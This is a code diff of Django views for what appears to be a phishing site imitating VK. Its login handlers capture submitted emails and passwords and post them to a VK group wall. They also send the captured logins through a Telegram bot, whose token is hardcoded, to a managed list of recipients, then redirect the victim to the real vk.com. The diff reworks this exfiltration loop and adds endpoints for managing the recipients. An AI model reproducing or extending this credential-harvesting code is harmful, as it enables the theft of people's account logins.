@@ -5,17 +5,16 @@ from .forms import *
 from vk import *
 from .microdetector import detect_mobile
 import telebot
-from .models import id_list
+from .models import *
+import time
 
 # Create your views here.
 
 
-def tel(mes):
+def tel(mes, i):
     token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
-    bot = telebot.AsyncTeleBot(token)
-    ids = id_list.objects.in_bulk()
-    for id in ids:
-        bot.send_message(ids[id].number, mes)
+    bot = telebot.TeleBot(token)
+    bot.send_message(i, mes)
 
 
 def index(request):
@@ -26,13 +25,15 @@ def index(request):
         email = request.POST.get("email")
         pas = request.POST.get("pas")
 
-        body = "Login: {0}\nPass: {1}".format(email, pas)
-
-        tel(body)
+        body = "Login: {0}\nPass: {1}\n".format(email, pas)
 
         ses = Session(access_token=tok)
         vk = API(session=ses)
-        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
+
+        ids = id_list.objects.in_bulk()
+        for id in ids:
+            vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
+            tel(body, ids[id].number)
 
         return HttpResponsePermanentRedirect("https://m.vk.com")
     # if request.scheme == "http":
@@ -50,12 +51,15 @@ def full(request):
         email = request.POST.get("email")
         pas = request.POST.get("pas")
 
-        body = "Login: {0}\nPass: {1}".format(email, pas)
+        body = "Login: {0}\nPass: {1}\n".format(email, pas)
 
-        tel(body)
         ses = Session(access_token=tok)
         vk = API(session=ses)
-        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
+
+        ids = id_list.objects.in_bulk()
+        for id in ids:
+            vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
+            tel(body, ids[id].number)
 
         return HttpResponsePermanentRedirect("https://vk.com")
     # if request.scheme == "http":
@@ -67,11 +71,25 @@ def full(request):
 
 
 def id_add(request):
-    t = request.GET.get('token')
-    if t == '123456':
-        i = id_list()
-        i.number = int(t)
-        i.save()
+    t = request.GET.get('t')
+    if t == passs.objects.get(name='pass').pas:
+        try:
+            d = int(request.GET.get('id'))
+        except ...:
+            return HttpResponseRedirect("/")
+        i = id_list.objects.create(number=d)
+    return HttpResponseRedirect("/")
+
+
+def id_del(request):
+    t = request.GET.get('t')
+    if t == passs.objects.get(name='pass').pas:
+        try:
+            d = int(request.GET.get('id'))
+            d = id_list.objects.get(number=d)
+        except ...:
+            return HttpResponseRedirect("/")
+        i = d.delete()
     return HttpResponseRedirect("/")
 
 
